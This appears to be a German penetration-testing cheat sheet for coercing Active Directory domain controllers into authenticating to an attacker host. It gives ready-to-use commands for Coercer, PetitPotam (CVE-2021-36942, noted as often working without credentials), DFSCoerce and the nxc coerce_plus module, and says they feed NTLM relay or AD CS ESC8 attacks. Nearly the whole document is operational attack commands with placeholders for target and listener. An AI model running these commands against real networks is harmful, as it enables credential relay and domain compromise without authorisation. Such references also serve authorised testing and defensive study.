# WEG

#plateform/linux #target/remote #cat/COERCE

% boris, coerce, coercer, petitpotam, dc, esc8, relay, allmethods
## [COERCE-a] Coercer - DC zur Auth zwingen (alle Methoden; fuer relay/esc8)
Speist den relay-Weg oder adcs-ESC8: erst Listener (impacket-ntlmrelayx/certipy-ad relay/responder) starten, dann hier zwingen. -t = Ziel-DC (IP ok) . -l = Angreifer-IP.
```
coercer coerce -l <lhost> -t <dc_ip> -u <user> -p '<password>' -d <domain> -v
```

% boris, coerce, petitpotam, efsrpc, cve-2021-36942, unauth, dc
## [COERCE-b] PetitPotam - unauth Coercion (EFSRPC; Positional: listener target)
Oft ohne Creds moeglich. Listener = lhost, Ziel = dc_ip.
```
python3 PetitPotam.py <lhost> <dc_ip>
```

% boris, coerce, dfscoerce, dfsnm, netdfs, dc
## [COERCE-c] DFSCoerce - Coercion ueber MS-DFSNM (NetrDfs*)
Greift wenn Spooler/EFSRPC gepatcht sind.
```
python3 dfscoerce.py -u <user> -p '<password>' -d <domain> <lhost> <dc_ip>
```

% boris, coerce, coerceplus, printerbug, spooler, nxc, module, listener
## [COERCE-d] nxc coerce_plus - Spooler/PrinterBug + weitere (bequem)
Ein Modul, mehrere Coercion-Methoden; LISTENER = lhost.
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> -M coerce_plus -o LISTENER=<lhost>
```

% boris, coerce, coercer, coerceplus, python, alternative
## [COERCE-e] Coercer.py - lokale Kopie (Alternative zum installierten coercer)
```
python3 Coercer.py coerce -l <lhost> -t <dc_ip> -u <user> -p '<password>' -d <domain>
```
